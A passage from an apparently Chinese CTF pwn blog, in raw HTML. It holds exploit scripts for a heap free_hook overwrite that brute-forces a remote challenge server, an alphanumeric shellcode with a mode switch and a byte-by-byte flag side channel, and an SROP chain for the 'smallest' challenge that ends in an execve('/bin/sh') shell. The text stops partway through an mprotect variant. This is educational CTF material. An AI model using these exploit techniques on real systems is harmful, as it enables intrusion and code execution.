class="line">    add(<span class="number">0x4e8</span>-<span class="number">1</span>,p64(<span class="number">0x30</span>)*<span class="number">8</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x31</span>)+p64(free_hook))</span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>,<span class="string">&quot;padding&quot;</span>)</span><br><span class="line">    add(<span class="number">0x28</span>-<span class="number">1</span>,p64(system_addr))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="comment">#add(0x18-1,&quot;A&quot;)</span></span><br><span class="line">    <span class="comment">#add(0x18-1,&quot;B&quot;)</span></span><br><span class="line">    <span class="comment">#delete(0)</span></span><br><span class="line">    <span class="comment">#add(0x18-1,p64(0x0)*2+(&quot;\x30&quot;+&quot;\x20&quot;).ljust(8,&quot;\x00&quot;))</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    <span class="comment">#p = process(binary, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;8.140.114.72&quot;</span>,<span class="number">1399</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        p.recv(timeout = <span class="number">0.5</span>) </span><br><span class="line">        <span class="comment">#要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError</span></span><br><span class="line">        EOFError</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>

<p>二、shellcode：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_16-43-10.png" alt="img"></p>
<p>只有系统号0x9,0x5,0x25,0x0,0xe7才能正常被执行，而0x5在32位下是open，即可以利用到open，mmap，和read函数。对于ORW少了一个W，可以使用flag的逐个字符比较的方法来爆破出flag。由于切换retfq需要涉及到构造32位的栈地址，所以这里最好还是用mmap来申请指定位置的一片空间，从而劫持栈。</p>
<p>(1)mmap的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,,0x7,0x22,0,0)*/</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rdx*/</span></span><br><span class="line"><span class="string">mov al,0x7</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rcx*/</span></span><br><span class="line"><span class="string">mov al,0x22</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rdi*/</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov edi,0x40404040</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rsi*/</span></span><br><span class="line"><span class="string">mov al,0x7e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set rax*/</span></span><br><span class="line"><span class="string">mov al,0x9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*set r8,r9*/</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">xor r9,r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>这里由于对输入字符做了限制，只能是可见字符，同时由于这里使用alpha3这个工具来将shellcode编码成可见字符。但是这个工具有一个缺点，就是不能出现\x00这个字符，所以如果我们使用mov rax,0x9则使得0x9在64位是0x0000000000000009，存在\x00字符，所以需要用到al,dl,等8位寄存器，来转换一下。</p>
<p>(2)read的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0x40404040</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov dl,0x70</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>读入到之前用mmap开辟的空间0x40404040处。</p>
<p>(3)retfq的设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov esp,0x40404440</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>①需要32位的栈，同时劫持esp，使得栈上的完全可控，防止push出错。</p>
<p>②这里0x23为转32位，0x33为转64位。</p>
<p>③push 0x40404040是在retfq之后跳转的地方，需要放到栈上。</p>
<p>▲汇编点：存在xor,mov,retfq多的时候，需要是：shellcode_x64 = asm(shellcode_x64,arch = ‘amd64’,os=’linux’)才行。</p>
<p>以上的很多不太知道原理，具体的在具体用到时候再改。</p>
<p>(4)orw中的or设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ecx, eax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_to64 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040402b</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rcx</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></div></figure>

<p>(5)爆破的汇编代码设置：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> flag_pos == <span class="number">0</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;0&#125;], &#123;1&#125;; jz $-5; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br></pre></td></tr></table></div></figure>

<p>这里的ch即为循环的可见字符，flag_pos是读出flag的对应位置，但是原理就是将读取的flag遍历比较所有可见字符，相等则使得程序跳入循环中，然后就可以通过设置timeout为某个值来判断这个字符是否相等，相等则加入到flag中。类似的有：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">check = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">cmp cl,dl</span></span><br><span class="line"><span class="string">jz loop</span></span><br><span class="line"><span class="string">mov al,231</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(reloc,ch)</span><br></pre></td></tr></table></div></figure>

<p>这里就用到了exit_group，另外rsp,rsi,甚至rbx都可以的，因为读取之后这三个寄存器都保存了flag的值：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-24_22-28-12.png" alt="img"></p>
<p>(6)汇总：</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">shellcode_open = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov eax, 5</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx, esp</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx, eax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_to64 = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x4040405b</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov rdx,0x70</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_open = asm(shellcode_open)</span><br><span class="line">shellcode_to64 = asm(shellcode_to64,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p, flag_pos, ch</span>):</span></span><br><span class="line">        payload = <span class="string">&quot;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y&quot;</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">        mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">        cmp cl,dl</span></span><br><span class="line"><span class="string">        jz loop</span></span><br><span class="line"><span class="string">        mov al,231</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        jmp loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(flag_pos,ch),arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag_pos == <span class="number">0</span>:</span><br><span class="line">            shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;&#125;], &#123;&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;&#125;], &#123;&#125;; jz $-5; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line">        check = asm(shellcode, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check </span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">my_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">flag_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment">#p = remote(&quot;39.105.137.118&quot;, 50050)</span></span><br><span class="line">        p = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(ch)</span><br><span class="line">            pwn(p, flag_pos, ch)</span><br><span class="line">            p.recvline(timeout=<span class="number">3.0</span>)</span><br><span class="line">            my_flag = my_flag + <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&gt;&quot;</span>, my_flag)</span><br><span class="line">            flag_pos += <span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            ch += <span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">    <span class="keyword">if</span>(my_flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">log.info(<span class="string">&quot;flag:%s&quot;</span>%my_flag)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/360ichunqiu%202017-smallest/">360ichunqiu 2017-smallest</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。</p>
<p>2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个syscall系统调用的就是read函数，读取的数取直接存入栈顶。由于buf大小为400h，且只有一个syscall，之后直接retn，没有leave指令，这就代表了rsp指向的地址就是我们执行完syscall后start函数retn的返回地址(pop eip)。也就是如果输入一个地址，读取完之后，通过retn就会跳转到该地址中。另外程序中除了retn之外没有其它对栈帧进行操作的指令，如果输入多个syscall地址，就可以反复执行syscall。并且最开始输入400h字节，程序流完全可控。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg" alt="img"></p>
<p>3.首先想到rop，但是题目没给Libc，并且通过调试发现，这个程序压根就没导入外部的Libc库，IDA中打开没有extern，完全没办法常规rop，那么想用SROP。远程调试一下查看堆栈数据，发现临时创建的smallest段数据没有可写权限，能够利用的只有[stack]栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据binsh从而调用execve(‘/bin/sh\x00’，0，0)来直接getshell。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg" alt="img"></p>
<p>4.之后观察栈上的数据，发现当运行到syscall时，rsp下方的内容全是栈上的地址。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg" alt="img"></p>
<p>rbp一直都是0x000……这是因为程序只有一个start函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用sys_write函数，来打印rsp指向的内容，也就是某个栈地址，这样就成功泄露栈地址。</p>
<p>5.但是sys_write的调用号是1，而通过调试发现rax的初始值被默认设置为0，并且程序中没有任何修改rax的代码。唯一一个也只有xor   rax, rax，但是任何数和本身异或的结果都是0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是0，也就是会无限循环read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后retn会直接跳转到rsp的下一行。这里选择让程序再执行一次sys_read函数，之后我们为其中一次输入一个字节，并且这次返回不再从xor这行代码开始执行，从mov rsi, rsp开始。由于sys_read的返回值自动写回给rax(一般函数的返回值都会写给rax)，所以读取几个字节read就向rax写入多少，这样就会使得rax也可以得到控制，不再被xor为0，调用我们想调用的系统函数。</p>
<p>6.所以编写payload:先尝试一下看能否泄露栈地址，test1.py</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload += p64(set_rsi_rdi_addr)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">#泄露栈地址之后返回到start，执行下一步操作。</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload[8:8+1])</span><br></pre></td></tr></table></div></figure>

<p>#利用sys_read随便读取一个字符，设置rax = 1，由于retn关系，rsp下拉了一个单位，所以这里会读入到原先的rsp+0x8处，也就是从原先的Payload中第8个字符开始，抽取一个字符，就是set_rsi_rdi_addr的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\xb8’)效果一样，都是为了不改变返回地址。之后再执行set_rsi_rdi_addr从而执行write函数，</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recv()[8:16]) + 0x100</span><br><span class="line">#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖</span><br><span class="line">log.info(&#x27;stack addr = %#x&#x27; %(stack_addr))</span><br></pre></td></tr></table></div></figure>

<p>7.这里可以看到成功泄露了一个栈地址，但是不能再用简单读入binsh字符串之后设置SigreturnFrame结构体来getshell，因为这里设置读入地址是通过rsp设置的。如果将rsp设置为我们想读入binsh的栈地址，那么肯定是可以读入binsh字符串的，但是当程序运行到retn时，跳转的是binsh这个地址，这是不合法的，没办法跳转，程序会崩溃。</p>
<p>这里就考虑使用SigreturnFrame()来进行栈劫持，将整个栈挪移到目的地。</p>
<p>(1)首先布置SigreturnFrame()的栈空间，进行栈劫持：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame() </span><br><span class="line">#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot</span><br><span class="line">frame_read.rax = constants.SYS_read#调用read读取payload2</span><br><span class="line">frame_read.rdi = 0#fd参数</span><br><span class="line">frame_read.rsi = stack_addr#读取payload2到rsi处</span><br><span class="line">frame_read.rdx = 0x300#读取长度为0x300</span><br><span class="line">#读取的大小</span><br><span class="line">frame_read.rsp = stack_addr#设置SROP执行完的rsp位置</span><br><span class="line">#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。</span><br><span class="line">frame_read.rip = syscall_addr#设置SROP中的一段代码指令</span><br></pre></td></tr></table></div></figure>

<p>(2)发送payload。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload1 = &quot;&quot;</span><br><span class="line">payload1 += p64(start_addr)#读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload1 += p64(syscall_addr)#利用rax=0xf0,调用SROP</span><br><span class="line">payload1 += str(frame_read)</span><br><span class="line">io.send(payload1)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload1[8:8+15])</span><br><span class="line">#为rax赋值为0xf0</span><br><span class="line">sleep(3)</span><br></pre></td></tr></table></div></figure>

<p>程序运行SROP过程中，会执行read函数，将payload2读取到stack_addr处，所以当程序运行完SROP后，栈顶rsp被劫持到stack_addr处，同时stack_addr上保存的内容是payload2，首地址是start，所以retn执行后仍旧从start开始。</p>
<p>(3)设置第二次的SigreturnFrame攻击：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_execve = SigreturnFrame()</span><br><span class="line">#设置execve的SROP帧，注意计算/bin/sh\x00所在地址</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = stack_addr+0x108</span><br><span class="line">frame_execve.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>这里的0x108是计算出来的，需要计算从stack_addr到rdi，也就是binsh字符串的距离。由于传进去的是结构体，大小为0xf8。前一个例子中binsh字符串是放在str(frameExecve)之前，所以没有那么大。这里却是放在str(frame_execve)之后，所以从stack_addr为起始，start_addr，syscall_addr，frame_execve)，总共为0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次start_addr读取字符串binsh的位置。</p>
<p>8.发送payload，读取binsh字符串，getshell：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(start_addr)#处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload2 += p64(syscall_addr)#处在stack_addr+0x08,利用rax=0xf0,调用SROP</span><br><span class="line">payload2 += str(frame_execve)#处在stack_addr+0x10</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;#处在stack+0x108处</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload2[8:8+15])</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>

<p>9.尝试使用mprotect为栈内存添加可执行权限x，从而shellcode来getshell。</p>
<p>(1)第一段的劫持栈和读取payload2进入劫持栈处都是一样的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame()#设置read的SROP帧</span><br><span class="line">frame_read.rax = constants.SYS_read</span><br><span class="line">frame_read.rdi = 0</span><br><span class="line">frame_read.rsi = stack_addr</span><br><span class="line">frame_read.rdx = 0x300</span><br><span class="line">frame_read.rsp = stack_addr</span><br><span class="line">#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start</span><br><span class="line">frame_read.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>(2)第二段需要调用mprotect来修改权限：</p>
